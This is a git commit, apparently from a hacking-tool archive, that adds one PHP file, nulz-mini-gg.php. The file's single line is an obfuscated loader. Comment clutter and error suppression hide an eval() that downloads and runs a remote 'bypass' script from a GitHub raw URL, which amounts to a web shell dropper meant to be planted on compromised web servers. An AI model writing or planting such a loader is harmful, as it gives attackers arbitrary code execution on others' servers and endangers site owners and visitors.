f9ef6ef43c1e17e344e52b7c6c83bd908ebf6866
NuLz <129581037+haxorstars@users.noreply.github.com>
2024-02-11 18:10:43 +0700

    NuLz

---
+++ nulz-mini/nulz-mini-gg.php
@@ -0,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/haxorstars/archive/main/nulz-mini/nulz-mini-bypas.php"))/******/ /*By NuLz404*/?>
